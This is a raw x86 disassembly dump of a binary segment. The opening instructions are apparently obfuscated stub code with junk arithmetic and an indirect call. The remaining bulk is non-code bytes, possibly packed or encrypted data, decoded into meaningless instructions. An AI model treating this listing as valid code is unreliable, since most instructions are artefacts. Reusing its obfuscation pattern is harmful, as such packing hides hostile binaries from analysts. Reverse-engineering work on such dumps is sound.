  4027d5:	add    ecx,eax
  4027d7:	mov    DWORD PTR ds:0x422008,0x50f1
  4027e1:	cmp    esi,ecx
  4027e3:	jne    0x404d01
  4027e9:	add    DWORD PTR ds:0x420f9c,0x56b8
  4027f3:	push   DWORD PTR [ebp+0x8]
  4027f6:	call   0x40233b
  4027fb:	mov    DWORD PTR [ebp-0x18],eax
  4027fe:	mov    eax,DWORD PTR [ebp-0x4]
  402801:	xor    edi,edi
  402803:	xor    edi,DWORD PTR ds:0x420eb6
  402809:	xor    ecx,ecx
  40280b:	add    ecx,DWORD PTR ds:0x423014
  402811:	sub    edi,ecx
  402813:	or     edi,DWORD PTR [edi+ecx*1]
  402816:	mov    ecx,DWORD PTR [ebp-0x18]
  402819:	add    edi,DWORD PTR ds:0x420e9a
  40281f:	xor    eax,ebx
  402821:	mov    edi,0x3272dd
  402826:	add    eax,edi
  402828:	mov    DWORD PTR ds:0x422004,0x6f95
  402832:	cmp    ecx,eax
  402834:	mov    DWORD PTR ds:0x420e96,0x4ad4
  40283e:	je     0x404e26
  402844:	add    DWORD PTR ds:0x420e8a,0x2aaf
  40284e:	push   DWORD PTR [ebp-0x18]
  402851:	push   DWORD PTR [ebp+0x8]
  402854:	neg    DWORD PTR ds:0x420f70
  40285a:	call   0x410a1b
  40285f:	and    DWORD PTR ds:0x420eec,0x0
  402869:	mov    ecx,DWORD PTR ds:0x420eec
  40286f:	inc    ecx
  402870:	mov    DWORD PTR ds:0x420eec,ecx
  402876:	cmp    DWORD PTR ds:0x420eec,0x7
  40287d:	jne    0x402893
  402883:	push   0x4240e4
  402888:	push   0x424143
  40288d:	call   DWORD PTR ds:0x4247dd
  402893:	cmp    DWORD PTR ds:0x420eec,0x6
  40289a:	jne    0x4028ad
  4028a0:	mov    ecx,DWORD PTR ds:0x420eec
  4028a6:	inc    ecx
  4028a7:	mov    DWORD PTR ds:0x420eec,ecx
  4028ad:	cmp    DWORD PTR ds:0x420eec,0x11
  4028b4:	jb     0x402869
  4028ba:	xor    DWORD PTR ds:0x420f00,edx
  4028c0:	mov    DWORD PTR [ebp-0x18],eax
  4028c3:	adc    ecx,DWORD PTR ds:0x420ef8
  4028c9:	jmp    0x404c56
  4028ce:	rcr    DWORD PTR [ecx-0x1e],cl
  4028d1:	mov    fs,esp
  4028d3:	jno    0x402950
  4028d5:	sti    
  4028d6:	inc    esi
  4028d7:	scas   eax,DWORD PTR es:[edi]
  4028d8:	dec    ebx
  4028d9:	imul   edi,DWORD PTR [ebp+esi*4+0x7a7a27ba],0x5f0a7a7a
  4028e4:	jp     0x402960
  4028e6:	adc    eax,0x1921172c
  4028eb:	and    eax,0x36652f1b
  4028f0:	imul   esp,DWORD PTR [esi-0x5c],0x6d6a6a61
  4028f7:	xor    al,ch
  4028f9:	fsubr  st(1),st
  4028fb:	push   eax
  4028fc:	dec    eax
  4028fd:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff90
  402901:	pusha  
  402902:	ins    DWORD PTR es:[edi],dx
  402903:	pop    ecx
  402904:	iret   
  402905:	pop    ebp
  402906:	dec    edx
  402907:	and    BYTE PTR [edx+edi*8+0x4d577687],cl
  40290e:	jg     0x402947
  402910:	jo     0x4028b8
  402912:	jg     0x4028b4
  402914:	mov    ds:0x66ff2c3b,al
  402919:	fdiv   st(2),st
  40291b:	push   ebx
  40291c:	jg     0x40293c
  40291e:	in     eax,dx
  40291f:	cmp    ebp,ecx
  402921:	mov    edx,0xde1387ed
  402926:	mov    ebp,DWORD PTR [ecx]
  402928:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c48a]
  40292f:	fld    QWORD PTR [esp+edx*8]
  402932:	push   cs
  402933:	cli    
  402934:	sbb    BYTE PTR es:[eax+0xc],cl
  402938:	imul   ebp,DWORD PTR es:[eax-0x47],0xffffffaf
  40293d:	adc    eax,DWORD PTR [ecx+0x5]
  402940:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402941:	(bad)  
  402942:	jmp    0x32b45490
  402947:	enter  0xf95b,0x1a
  40294b:	cli    
  40294c:	js     0x4028ef
  40294e:	arpl   bp,bx
  402950:	cwde   
  402951:	pop    edi
  402952:	mov    esp,DWORD PTR [ecx+0x31821407]
  402958:	repz sahf 
  40295a:	cmp    al,0x72
  40295c:	jae    0x402969
  40295e:	fisubr DWORD PTR ds:0x33348d52
  402964:	push   esp
  402965:	jecxz  0x402936
  402967:	mov    ch,BYTE PTR [ecx]
  402969:	mov    DWORD PTR [eax+0x5188ccb7],esi
  40296f:	in     al,0x45
  402971:	push   edx
  402972:	dec    esp
  402973:	or     al,0x3e
  402975:	repz add ebp,DWORD PTR ss:[ebp+0x30a7ca4b]
  40297d:	rol    BYTE PTR [esi+edx*2],0xfd
  402981:	push   edx
  402982:	push   esi
  402983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402984:	stc    
  402985:	push   0x1f42f8bf
  40298a:	dec    esp
  40298b:	xor    eax,0x79b31e07
  402990:	cdq    
  402991:	shl    BYTE PTR [edi+0x343e755c],1
  402997:	adc    esp,0x31a101d6
  40299d:	jmp    0xc047:0x55808d5f
  4029a4:	cmp    BYTE PTR [ecx-0x6c778a88],bl
  4029aa:	add    al,0x1f
  4029ac:	push   ds
  4029ad:	ror    esi,cl
  4029af:	int    0x9f
  4029b1:	adc    dh,BYTE PTR [ecx-0x16]
  4029b4:	jo     0x402a01
  4029b6:	stc    
  4029b7:	dec    eax
  4029b8:	aad    0x7b
  4029ba:	in     al,0xd7
  4029bc:	leave  
  4029bd:	jl     0x4029ff
  4029bf:	inc    ebx
  4029c0:	xor    ecx,DWORD PTR [esi]
  4029c2:	jmp    0xe7d10881
  4029c7:	cmp    ecx,edx
  4029c9:	adc    BYTE PTR [edx-0x1f],ch
  4029cc:	mov    DWORD PTR [ebp+0x715059a6],esi
  4029d2:	inc    edi
  4029d3:	pushf  
  4029d4:	gs pushf 
  4029d6:	jle    0x402a1f
  4029d8:	pop    edx
  4029d9:	jo     0x402a25
  4029db:	mov    bl,0xcc
  4029dd:	stc    
  4029de:	les    edi,FWORD PTR [edx-0x5b66fcfd]
  4029e4:	add    al,ch
  4029e6:	adc    eax,0x14df134f
  4029eb:	fs inc ebp
  4029ed:	sbb    cl,BYTE PTR [ecx]
  4029ef:	xchg   BYTE PTR [ebx+0x1f6f7b91],cl
  4029f5:	or     DWORD PTR [eax+0x5d],ecx
  4029f8:	pop    edx
  4029f9:	and    eax,0x6126f3e2
  4029fe:	xchg   edi,eax
  4029ff:	jg     0x402a63
  402a01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a02:	xchg   esp,eax
  402a03:	pop    ecx
  402a04:	jle    0x4029da
  402a06:	xor    DWORD PTR [edx-0x19],0x7c
  402a0a:	repz inc esp
  402a0c:	adc    eax,0x559835f9
  402a11:	pop    eax
  402a12:	loopne 0x4029c2
  402a14:	pop    esp
  402a15:	popa   
  402a16:	fst    DWORD PTR [edx]
  402a18:	lods   al,BYTE PTR ds:[esi]
  402a19:	or     ch,BYTE PTR [ebp+0x4bdc77b0]
  402a1f:	test   al,0x25
  402a21:	mov    al,ds:0xb459ac5d
  402a26:	jne    0x402a93
  402a28:	lds    esi,FWORD PTR [edi+0xabc63e5]
  402a2e:	and    DWORD PTR [esi-0x46],ebx
  402a31:	mov    ds:0xca05d9b4,al
  402a36:	ss xchg edx,eax
  402a38:	out    dx,al
  402a39:	inc    esi
  402a3a:	jne    0x402a39
  402a3c:	in     al,0x56
  402a3e:	cmp    al,bl
  402a40:	add    al,0x7c
  402a42:	push   cs
  402a43:	mov    edi,0xa2c7a6b3
  402a48:	outs   dx,DWORD PTR ds:[esi]
  402a49:	fistp  DWORD PTR [edx]
  402a4b:	(bad)  
  402a4c:	pop    edx
  402a4d:	inc    esp
  402a4e:	mov    eax,ds:0x720e859a
  402a53:	enter  0x928e,0xcb
  402a57:	inc    ebp
  402a58:	sar    BYTE PTR [edi],1
  402a5a:	fld    DWORD PTR [eax+ebx*4+0x60a6f581]
  402a61:	push   edx
  402a62:	into   
  402a63:	enter  0x838b,0xcb
  402a67:	add    ebp,ebx
  402a69:	nop
  402a6a:	loope  0x402a6c
  402a6c:	es repnz test dl,dl
  402a70:	and    bh,bl
  402a72:	sti    
  402a73:	sub    BYTE PTR [ecx+0x21],0xc8
  402a77:	adc    BYTE PTR [eax-0x23],bl
  402a7a:	add    BYTE PTR [eax],dh
  402a7c:	iret   
  402a7d:	and    al,BYTE PTR [eax+eiz*2]
  402a80:	pop    esp
  402a81:	lock ds dec ebx
  402a84:	cmp    ebx,DWORD PTR [ecx-0x58d29c1b]
  402a8a:	push   ebx
  402a8b:	(bad)
  402a8f:	mov    al,0x37
  402a91:	jae    0x402a47
  402a93:	pop    eax
  402a94:	pushf  
  402a95:	bound  edx,QWORD PTR [edx]
  402a97:	xor    al,0x8b
  402a99:	add    BYTE PTR [edx+0x62ff2071],0x7e
  402aa0:	jnp    0x402a96
  402aa2:	adc    DWORD PTR [ebp-0x4f451b21],esp
  402aa8:	lds    esp,FWORD PTR [ebp+0x53f7e5ca]
  402aae:	in     eax,0xdb
  402ab0:	addr16 push 0xb50157e1
  402ab6:	mov    edx,0xf4557adc
  402abb:	adc    ch,BYTE PTR [ebp-0x7eba7c3f]
  402ac1:	cmp    BYTE PTR [edx-0x21],cl
  402ac4:	test   BYTE PTR [ebx],dh
  402ac6:	in     al,0x8c
  402ac8:	popf   
  402ac9:	in     eax,0xb8
  402acb:	mov    bl,bh
  402acd:	xchg   BYTE PTR [edx+0x33],al
  402ad0:	mov    eax,0x186b171e
  402ad5:	pusha  
  402ad6:	jp     0x402b52
  402ad8:	pop    ebx
  402ad9:	sub    BYTE PTR [ebx],bl
  402adb:	repz inc edi
  402add:	mov    dl,dh
  402adf:	shl    esp,0xad
  402ae2:	inc    edi
  402ae3:	aam    0xf7
  402ae5:	dec    ebp
  402ae6:	dec    esp
  402ae7:	add    bh,BYTE PTR [eax]
  402ae9:	out    0x41,al
  402aeb:	aaa    
  402aec:	mov    bl,0x4f
  402aee:	and    eax,0x3459832b
  402af3:	ret    0xe45b
  402af6:	mov    dh,0xf0
  402af8:	sbb    BYTE PTR [esi-0x5461a2b2],ch
  402afe:	sub    DWORD PTR [ebx],ebx
  402b00:	loope  0x402b15
  402b02:	sbb    al,bl
  402b04:	mov    ebp,0x376db103
  402b09:	mov    BYTE PTR [ebp-0x41],bl
  402b0c:	inc    esi
  402b0d:	sbb    dh,BYTE PTR [edi-0x130bb4ea]
  402b13:	mov    dl,al
  402b15:	cmp    eax,0x2a7b8e8c
  402b1a:	leave  
  402b1b:	test   BYTE PTR [eax+0x5fa5d1bc],0x27
  402b22:	nop
  402b23:	jmp    ebx
  402b25:	repnz sbb eax,0x24b40c02
  402b2b:	outs   dx,BYTE PTR cs:[esi]
  402b2d:	xchg   ebp,eax
  402b2e:	js     0x402b69
  402b30:	dec    ecx
  402b31:	daa    
  402b32:	xor    DWORD PTR [edi+0x25aa7214],0x7e
  402b39:	adc    al,BYTE PTR [edx+eax*8-0x42ed9321]
  402b40:	sbb    DWORD PTR ds:0xb1e93af7,0xe
  402b47:	popa   
  402b48:	and    ch,dh
  402b4a:	sahf   
  402b4b:	retf   
  402b4c:	pop    ss
  402b4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b4e:	cmc    
  402b4f:	sbb    esi,DWORD PTR [edx]
  402b51:	dec    ebx
  402b52:	cmp    dl,BYTE PTR [eax+0x2e]
  402b55:	stos   BYTE PTR es:[edi],al
  402b56:	frstor [ecx+0x42]
  402b59:	adc    edx,DWORD PTR [edi+0x6c]
  402b5c:	scas   eax,DWORD PTR es:[edi]
  402b5d:	push   edi
  402b5e:	lds    ebp,FWORD PTR [edx]
  402b60:	and    eax,0xf4a08a02
  402b65:	out    dx,eax
  402b66:	mov    ch,0x87
  402b68:	shl    BYTE PTR [ebx+0x5860a66a],1
  402b6e:	push   esi
  402b6f:	mov    cl,0xc1
  402b71:	mov    edx,0x25a211b
  402b76:	pushaw 
  402b78:	jb     0x402bc0
  402b7a:	sbb    cl,BYTE PTR [ebp+ebx*8-0x193397c3]
  402b81:	std    
  402b82:	adc    DWORD PTR [edx-0x772b0767],ebp
  402b88:	sti    
  402b89:	out    0xfb,eax
  402b8b:	(bad)  
  402b8c:	cwde   
  402b8d:	lds    ebx,FWORD PTR [ebx]
  402b8f:	dec    ebp
  402b90:	xlat   BYTE PTR ds:[ebx]
  402b91:	cmp    DWORD PTR [edx],edx
  402b93:	dec    eax
  402b94:	stos   BYTE PTR es:[edi],al
  402b95:	and    ch,ah
  402b97:	vpmullw ymm4,ymm6,YMMWORD PTR [ebx+edi*4+0x73cc622]
  402ba0:	loop   0x402ba0
  402ba2:	call   0x12e0:0x59742631
  402ba9:	or     BYTE PTR [esi+0x274a3716],dl
  402baf:	mov    al,ds:0x3baf3a21
  402bb4:	cwde   
  402bb5:	cmc    
  402bb6:	add    BYTE PTR [ebp+0x6c9fcf4d],dh
  402bbc:	and    BYTE PTR [edi+0x3d],ch
  402bbf:	dec    esp
  402bc0:	mov    ds:0x21a9138b,al
  402bc5:	in     eax,dx
  402bc6:	retf   0x2797
  402bc9:	daa    
  402bca:	add    BYTE PTR [eax+0x31],al
  402bcd:	sbb    DWORD PTR [esi],esp
  402bcf:	loopne 0x402b9e
  402bd1:	mov    bl,0x53
  402bd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402bd4:	adc    BYTE PTR [eax-0x32a52954],ch
  402bda:	je     0x402c4e
  402bdc:	lahf   
  402bdd:	aad    0xf5
  402bdf:	mov    ss,edi
  402be1:	pop    ss
  402be2:	ficom  DWORD PTR [ebx+esi*2-0x7b]
  402be6:	(bad)  
  402be7:	rol    ebp,1
  402be9:	shl    BYTE PTR cs:[eax-0x418703e],1
  402bf0:	xor    DWORD PTR [eax],esp
  402bf2:	and    al,0xfb
  402bf4:	stos   DWORD PTR es:[edi],eax
  402bf5:	mov    dl,0xf5
  402bf7:	into   
  402bf8:	shl    BYTE PTR ds:[eax+0x71ffda67],1
  402bff:	rcl    BYTE PTR [edi],cl
  402c01:	jns    0x402bd1
  402c03:	or     ch,ah
  402c05:	push   edi
  402c06:	lahf   
  402c07:	loope  0x402b92
  402c09:	pop    ebp
  402c0a:	jo     0x402bf6
  402c0c:	jg     0x402c6c
  402c0e:	mov    al,ds:0x84526d8c
  402c13:	sbb    DWORD PTR [ecx-0x6456cb35],esi
  402c19:	fsub   DWORD PTR [ecx-0x4987bdc2]
  402c1f:	out    0x20,al
  402c21:	rol    bl,1
  402c23:	cs ins DWORD PTR es:[edi],dx
  402c25:	mov    ds:0xf41c8985,al
  402c2a:	inc    edx
  402c2b:	enter  0x765e,0x2
  402c2f:	jno    0x402c80
  402c31:	std    
  402c32:	loope  0x402c3e
  402c34:	or     DWORD PTR [esi],edi
  402c36:	hlt    
  402c37:	inc    ebx
  402c38:	xor    al,0x27
  402c3a:	jmp    0x942f:0xde9efeb
  402c41:	adc    DWORD PTR [edi-0x49012d30],0xb7c57b9f
  402c4b:	ds int3 
  402c4d:	or     dh,ch
  402c4f:	scas   eax,DWORD PTR es:[edi]
  402c50:	inc    ebx
  402c51:	add    dh,0xcb
  402c54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c55:	jmp    0x7a6:0x1fbd06df
  402c5c:	mov    ah,ch
  402c5e:	jl     0x402c34
  402c60:	clc    
  402c61:	or     al,0x9e
  402c63:	add    bh,BYTE PTR [edi-0x76]
  402c66:	gs daa 
  402c68:	fwait
  402c69:	int    0x8d
  402c6b:	and    ecx,DWORD PTR [ebp-0x35953ed1]
  402c71:	shl    DWORD PTR [edx+0x49],0x21
  402c75:	mov    edi,0x802d812e
  402c7a:	jl     0x402c57
  402c7c:	jecxz  0x402c0b
  402c7e:	or     esp,DWORD PTR [ecx+edx*2-0x74f49a40]
  402c85:	retf   0xf2d4
  402c88:	add    bl,BYTE PTR ds:0x3283f966
  402c8e:	add    cl,0x33
  402c91:	into   
  402c92:	inc    edx
  402c93:	xchg   edi,eax
  402c94:	test   eax,0xbd7980b7
  402c99:	fwait
  402c9a:	inc    esp
  402c9b:	cmp    BYTE PTR [ebp+0x4c],bh
  402c9e:	add    eax,0x42a2983c
  402ca3:	les    esp,FWORD PTR [eax-0x5210dfc3]
  402ca9:	sub    ebx,eax
  402cab:	push   eax
  402cac:	jle    0x402c3b
  402cae:	outs   dx,BYTE PTR ds:[esi]
  402caf:	and    eax,0x1733696a
  402cb4:	lea    edx,[edx+0x51]
  402cb7:	inc    edx
  402cb8:	scas   al,BYTE PTR es:[edi]
  402cb9:	mov    edi,0x6869ec0e
  402cbe:	cmp    BYTE PTR [ebp-0x2c],al
  402cc1:	test   dl,cl
  402cc3:	sub    DWORD PTR [edi+ebx*4],esp
  402cc6:	add    al,0x85
  402cc8:	in     eax,0xbd
  402cca:	cdq    
  402ccb:	lock outs dx,BYTE PTR ds:[esi]
  402ccd:	xchg   edi,eax
  402cce:	(bad)  
  402ccf:	lods   al,BYTE PTR ds:[esi]
  402cd0:	test   eax,0xf5f7dbbb
  402cd5:	imul   DWORD PTR [esi-0xf]
  402cd8:	pop    ss
  402cd9:	lods   al,BYTE PTR ds:[esi]
  402cda:	or     esp,DWORD PTR [edx+0x49]
  402cdd:	pop    ss
  402cde:	cmp    eax,0xaec83a18
  402ce3:	xchg   esp,eax
  402ce4:	mov    cl,0x67
  402ce6:	push   0x2c
  402ce8:	inc    edx
  402ce9:	mov    bl,0xc0
  402ceb:	out    0x91,al
  402ced:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402cee:	jo     0x402cf3
  402cf0:	setge  BYTE PTR [esi*8+0x35d52155]
  402cf8:	stc    
  402cf9:	jl     0x402d58
  402cfb:	pop    ecx
  402cfc:	add    BYTE PTR [eax],dh
  402cfe:	jo     0x402cde
  402d00:	je     0x402cc6
  402d02:	fwait
  402d03:	into   
  402d04:	cmc    
  402d05:	sti    
  402d06:	je     0x402d40
  402d08:	cwde   
  402d09:	mul    esp
  402d0b:	jnp    0x402c92
  402d0d:	xor    esp,esi
  402d0f:	fs nop
  402d11:	dec    esp
  402d12:	inc    esp
  402d13:	xor    al,0xf3
  402d15:	dec    ebp
  402d16:	mov    ?,WORD PTR [ebp+0x45e76142]
  402d1c:	fnstsw WORD PTR ds:[edi]
  402d1f:	aas    
  402d20:	sub    al,0xa0
  402d22:	push   ds
  402d23:	or     edi,0xffffffde
  402d26:	inc    esp
  402d27:	fs jnp 0x402cfa
  402d2a:	xchg   ebx,eax
  402d2b:	in     eax,dx
  402d2c:	add    al,0xdc
  402d2e:	(bad)  
  402d2f:	and    edx,DWORD PTR ds:0x9bd636ea
  402d35:	push   ebp
  402d36:	and    al,0x77
  402d38:	mov    ss,WORD PTR [ecx+0xb]
  402d3b:	mov    cl,0xc4
  402d3d:	jle    0x402d55
  402d3f:	enter  0xd7f,0x49
  402d43:	in     eax,0x2e
  402d45:	pop    edx
  402d46:	cmp    al,0x5
  402d48:	dec    edi
  402d49:	jle    0x402d79
  402d4b:	sbb    eax,0x1301d210
  402d50:	jle    0x402d20
  402d52:	pop    eax
  402d53:	fs push 0xf5a9e97d
  402d59:	and    BYTE PTR [ebx],dh
  402d5b:	fs pushf 
  402d5d:	pusha  
  402d5e:	mov    BYTE PTR [eax-0x5b9b04fb],dl
  402d64:	and    esi,esp
  402d66:	xchg   ebp,eax
  402d67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d68:	add    ebx,DWORD PTR [eax+0x63]
  402d6b:	popa   
  402d6c:	fcmovbe st,st(4)
  402d6e:	dec    ebp
  402d6f:	xchg   edi,eax
  402d70:	enter  0x932c,0x96
  402d74:	and    al,0x23
  402d76:	inc    edi
  402d77:	pop    eax
  402d78:	mov    BYTE PTR [eax-0x650ee1ea],bh
  402d7e:	mov    cl,0x13
  402d80:	inc    ecx
  402d81:	jo     0x402df7
  402d83:	stc    
  402d84:	xor    esi,edx
  402d86:	(bad)  
  402d87:	and    ch,BYTE PTR [esp+ebx*8-0xb]
  402d8b:	ret    0xe433
  402d8e:	xor    al,0x7
  402d90:	rcr    BYTE PTR [edi-0x1b7599e7],1
  402d96:	ds rcr BYTE PTR fs:[edi],1
  402d9a:	inc    ebx
  402d9b:	inc    ecx
  402d9c:	mov    bl,0xf4
  402d9e:	loopne 0x402d7b
  402da0:	mov    eax,0xeffdc408
  402da5:	push   esi
  402da6:	mov    ebx,0x4ac8db65
  402dab:	rol    esi,0x1c
  402dae:	nop
  402daf:	hlt    
  402db0:	(bad)  
  402db1:	test   eax,0xf0f7ea8c
  402db6:	aas    
  402db7:	mov    ?,WORD PTR [edi-0x2d]
  402dba:	scas   al,BYTE PTR es:[edi]
  402dbb:	inc    ebp
  402dbc:	cld    
  402dbd:	sub    bh,BYTE PTR [ecx+0x36]
  402dc0:	jl     0x402d44
  402dc2:	add    esp,edi
  402dc4:	loope  0x402d86
  402dc6:	add    dl,bl
  402dc8:	in     eax,dx
  402dc9:	sbb    eax,0x7c5215b8
  402dce:	or     DWORD PTR [edx+0x60b6d9b],esi
  402dd4:	out    0x2e,al
  402dd6:	fist   WORD PTR [eax+ecx*4+0x3960d67b]
  402ddd:	push   ebx
  402dde:	outs   dx,DWORD PTR ds:[esi]
  402ddf:	(bad)  [esi+0x1f]
  402de2:	inc    ebp
  402de3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402de4:	add    DWORD PTR [esi],eax
  402de6:	xlat   BYTE PTR ds:[ebx]
  402de7:	mov    bh,0x4b
  402de9:	popf   
  402dea:	add    al,0xb
  402dec:	jne    0x402e38
  402dee:	dec    esp
  402def:	inc    ebp
  402df0:	loopne 0x402e17
  402df2:	mov    eax,0x671ca3c6
  402df7:	mov    edx,0xe919eaef
  402dfc:	in     eax,0xd6
  402dfe:	int    0x8b
  402e00:	loop   0x402e2f
  402e02:	les    edi,FWORD PTR es:[ecx-0x25d14282]
  402e09:	clc    
  402e0a:	xor    eax,0x4ed64c73
  402e0f:	or     bh,dh
  402e11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402e12:	aam    0xa3
  402e14:	add    ecx,DWORD PTR [eax+0x50d15f1d]
  402e1a:	pop    esi
  402e1b:	inc    ebx
  402e1c:	shr    BYTE PTR ds:0xffd8a8f7,0x60
  402e23:	sbb    DWORD PTR [eax+0x4104ed41],edx
  402e29:	xchg   edi,eax
  402e2a:	adc    eax,0x4593623c
  402e2f:	push   esp
  402e30:	inc    eax
  402e31:	js     0x402dee
  402e33:	arpl   si,cx
  402e35:	hlt    
  402e36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e37:	jnp    0x402dee
  402e39:	das    
  402e3a:	popa   
  402e3b:	int    0x0
  402e3d:	jle    0x402eb5
  402e3f:	ins    DWORD PTR es:[edi],dx
  402e40:	push   0x61cb8a51
  402e45:	nop
  402e46:	cmp    BYTE PTR [ebp+ebp*4+0x5da19b1],0xf
  402e4e:	ret    0x4583
  402e51:	into   
  402e52:	pop    ss
  402e53:	inc    esp
  402e54:	dec    esp
  402e55:	cld    
  402e56:	and    BYTE PTR [edx],bh
  402e58:	mov    WORD PTR [edx+0x6c4b01d6],fs
  402e5e:	add    al,0x8a
  402e60:	push   edi
  402e61:	fild   DWORD PTR [eax+0x18]
  402e64:	jl     0x402df7
  402e66:	rcr    ah,cl
  402e68:	mov    ch,0xb0
  402e6a:	push   edi
  402e6b:	test   al,al
  402e6d:	xor    al,0x86
  402e6f:	or     BYTE PTR [esi-0x4e],cl
  402e72:	sbb    ah,bh
  402e74:	and    dh,BYTE PTR [eax-0x165a0a81]
  402e7a:	pop    ecx
  402e7b:	fldcw  WORD PTR [esi]
  402e7d:	popf   
  402e7e:	push   ds
  402e7f:	shl    cl,cl
  402e81:	add    ebp,DWORD PTR [ebx]
  402e83:	mov    dl,0x9f
  402e85:	ins    DWORD PTR es:[edi],dx
  402e86:	lods   al,BYTE PTR ds:[esi]
  402e87:	(bad)  
  402e88:	push   ebp
  402e89:	push   ebx
  402e8a:	je     0x402e10
  402e8c:	sub    BYTE PTR [ebp+0x10],0xba
  402e90:	test   DWORD PTR [ebp+0x65a7d642],ebp
  402e96:	in     al,dx
  402e97:	lods   al,BYTE PTR ds:[esi]
  402e98:	mov    bh,0x6f
  402e9a:	push   ds
  402e9b:	fcmovbe st,st(3)
  402e9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e9e:	xchg   DWORD PTR [ebx+0x59ee82bf],ecx
  402ea4:	mov    ebp,0xeb965902
  402ea9:	repnz add ecx,edi
  402eac:	loope  0x402e40
  402eae:	xor    edx,0x53769c84
  402eb4:	cdq    
  402eb5:	out    dx,al
  402eb6:	and    al,0x7d
  402eb8:	jecxz  0x402f2d
  402eba:	arpl   WORD PTR [eax],bx
  402ebc:	xchg   edx,eax
  402ebd:	sbb    eax,0xc2e1538a
  402ec2:	mov    al,0xf
  402ec4:	in     al,dx
  402ec5:	iret   
  402ec6:	pop    es
  402ec7:	ret    0x3042
  402eca:	outs   dx,BYTE PTR ds:[esi]
  402ecb:	xor    dh,BYTE PTR [edx+0x22]
  402ece:	ret    
  402ecf:	xor    al,0x36
  402ed1:	scas   al,BYTE PTR es:[edi]
  402ed2:	enter  0xbef8,0x35
  402ed6:	and    eax,0xc4c7d809
  402edb:	mov    edi,0x2f632665
  402ee0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ee1:	xchg   dh,cl
  402ee3:	inc    ecx
  402ee4:	data16 mov ch,0x56
  402ee7:	cmp    eax,0x5f7a6791
  402eec:	mov    edx,ebx
  402eee:	add    dl,BYTE PTR [edi+eax*4-0xfb90f41]
  402ef5:	or     BYTE PTR [esi],cl
  402ef7:	push   0x9ccd6e7f
  402efc:	inc    ebx
  402efd:	sub    eax,0x2504104f
  402f02:	xor    eax,DWORD PTR [ebx+0x38]
  402f05:	dec    ecx
  402f06:	sbb    bh,BYTE PTR [ebx]
  402f08:	js     0x402ebd
  402f0a:	lods   al,BYTE PTR ds:[esi]
  402f0b:	gs loope 0x402f0a
  402f0e:	lods   al,BYTE PTR ds:[esi]
  402f0f:	mov    bh,0x99
  402f11:	and    BYTE PTR [esi],0xb0
  402f14:	pop    ecx
  402f15:	popf   
  402f16:	sbb    al,0x6b
  402f18:	mov    ebp,0x18cec1df
  402f1d:	fiadd  DWORD PTR [esi-0x4]
  402f20:	cmp    bh,BYTE PTR [edx-0x33]
  402f23:	jle    0x402f94
  402f25:	adc    al,0x18
  402f27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f28:	mov    ecx,0x1342b42f
  402f2d:	and    BYTE PTR [eax+0x20],0xbc
  402f31:	fild   QWORD PTR [ebx+0x27]
  402f34:	xchg   DWORD PTR [edx+0x23],edi
  402f37:	inc    edi
  402f38:	xor    ebx,DWORD PTR [edi-0x5e]
  402f3b:	and    al,0x71
  402f3d:	iret   
  402f3e:	popfw  
  402f40:	dec    ebx
  402f41:	pushf  
  402f42:	out    0xa9,al
  402f44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f45:	xor    BYTE PTR [eax-0x61a5fc71],bl
  402f4b:	mov    al,0x90
  402f4d:	imul   edi,DWORD PTR [edi-0xd],0x6d4e6eac
  402f54:	fadd   QWORD PTR [ecx+eiz*1]
  402f57:	inc    edx
  402f58:	pusha  
  402f59:	addr16 push cs
  402f5b:	mov    edx,0xe1c8be51
  402f60:	cmp    eax,0x7f1ae7c1
  402f65:	lds    ebx,FWORD PTR [ebp+0x64]
  402f68:	dec    edi
  402f69:	push   es
  402f6a:	jo     0x402ef1
  402f6c:	pop    ss
  402f6d:	ja     0x402f01
  402f6f:	add    al,0x4d
  402f71:	ins    DWORD PTR es:[edi],dx
  402f72:	cmp    al,0x6f
  402f74:	mov    WORD PTR [esi+0x440ce724],gs
  402f7a:	mov    bl,0x3b
  402f7c:	mov    cl,0x6
  402f7e:	xchg   DWORD PTR [eax+0x6056fbe3],ebp
  402f84:	loopne 0x402f81
  402f86:	loope  0x402fe8
  402f88:	das    
  402f89:	imul   edi,DWORD PTR ds:[eax+0x64],0x40
  402f8e:	adc    eax,0x9f33f953
  402f93:	fiadd  DWORD PTR [edi+0x45bb89c0]
  402f99:	lods   al,BYTE PTR ds:[esi]
  402f9a:	and    ecx,DWORD PTR [edi+eiz*1+0x6b581b04]
  402fa1:	sbb    ecx,DWORD PTR [eax-0x38]
  402fa4:	sbb    BYTE PTR [ecx-0x3b],ch
  402fa7:	out    0xa1,eax
  402fa9:	mov    dh,0x2a
  402fab:	push   ecx
  402fac:	or     al,0xfa
  402fae:	adc    eax,ebx
  402fb0:	rol    DWORD PTR [esi-0x71e0a238],1
  402fb6:	or     al,0x33
  402fb8:	jge    0x402fe4
  402fba:	and    eax,edi
  402fbc:	out    dx,eax
  402fbd:	mov    eax,0xedde4406
  402fc2:	xor    BYTE PTR ds:0x8b30fe9a,cl
  402fc8:	push   esp
  402fc9:	xchg   esp,eax
  402fca:	enter  0x1dcf,0xa7
  402fce:	imul   esp,DWORD PTR [edi-0xb],0x7d
  402fd2:	rol    DWORD PTR [esi],cl
  402fd4:	test   eax,0xe5c172b3
  402fd9:	lods   al,BYTE PTR ds:[esi]
  402fda:	jmp    0x43df:0xa4386e25
  402fe1:	fnstcw WORD PTR [ebx-0x70]
  402fe4:	and    ebp,DWORD PTR [edx-0x5d5778ee]
  402fea:	out    0x66,eax
  402fec:	mov    eax,ds:0xb00e6a7a
  402ff1:	ins    DWORD PTR es:[edi],dx
  402ff2:	aas    
  402ff3:	aas    
